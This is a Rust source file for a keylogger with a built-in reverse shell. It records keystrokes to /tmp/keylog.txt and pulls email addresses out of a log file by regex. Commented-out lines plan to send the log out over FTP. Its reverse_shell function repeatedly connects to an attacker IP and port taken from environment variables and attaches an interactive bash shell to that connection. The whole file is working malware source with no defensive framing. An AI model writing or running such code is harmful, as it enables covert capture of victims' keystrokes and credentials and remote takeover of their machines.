use std::fs::OpenOptions;
use std::io::{Write};
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use device_query::{ Keycode };
use dotenv::dotenv;
use std::{ env };
use std::{thread, time};
use regex::Regex;
use std::fs;

pub fn match_case(key: &Keycode) -> &'static str {

    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open("/tmp/keylog.txt")
        .expect("Failed to open file");

    size_check(&mut file);

    // using match expression
    match *key {
        Keycode::Space => {
            // write to file
            file.write(b" ").expect("Failed to write to file");
            "Space"
        }
        Keycode::Enter => {
            // write to file
            file.write(b"\n").expect("Failed to write to file");
            "Enter"
        }
        Keycode::RShift | Keycode::Slash => {
            // write to file
            file.write(b"?").expect("Failed to write to file");
            "?"
        } 
        _ => { 
            write!(file, "{}",  key).expect("Failed to write to file");  
            "Other"
        }
    }    
}

// check if file is too big
// if it is, then send it via ftp
fn size_check(file: &mut std::fs::File) {
    let file_size = file.metadata().unwrap().len();
    if file_size > 100 {
        // format_check(file);
        let file_contents = fs::read_to_string("/tmp/keysslog.txt").unwrap();

        let re = Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}").unwrap();
        // print the matches
        for cap in re.captures_iter(&file_contents) {
            println!("{}", &cap[0]);
        }

        println!("File is too big");
        // send_file(file);
        // empty file
        file.set_len(0).expect("Failed to empty file");
    }
}

// regex to check if file contains emails
// [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}
// a function the checks if file contains emails or passwords
// by looking with regex patterns
// fn format_check(file: &mut std::fs::File) {
//     let mut file_content = String::new();
//     file.read_to_string(&mut file_content).expect("Failed to read file");
//     
//     let re = Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}").unwrap();
//     // print the matches
//     for cap in re.captures_iter(&file_content) {
//         println!("{}", &cap[0]);
//     }
// }

pub fn reverse_shell() {
    dotenv().ok();
    
    // read key and value from file
    let key = env::var("IP").unwrap();
    let value = env::var("PORT").unwrap();
    let addr = format!("{}:{}", key, value);

    loop {
        thread::sleep(time::Duration::from_millis(20000));   

        match TcpStream::connect(addr.clone()) {
            Ok(stream) => {
                // println!("Connected to {}", addr);
                let fd = stream.as_raw_fd();

                Command::new("/bin/bash")
            .       arg("-i")
            .       stdin(unsafe { Stdio::from_raw_fd(fd) })
            .       stdout(unsafe { Stdio::from_raw_fd(fd) })
            .       stderr(unsafe { Stdio::from_raw_fd(fd) })
            .       spawn()
            .       unwrap()
            .       wait()
            .       unwrap();
            }
            Err(_e) => {
                // println!("Failed to connect to {}: {}", addr, e);
            }
        }
    }    
}


// --------------------- UNIT TESTS --------------------- //
#[cfg(test)]
mod tests {
    #[test]
    fn it_works() {
        assert_eq!(2 + 2, 4);
    }
}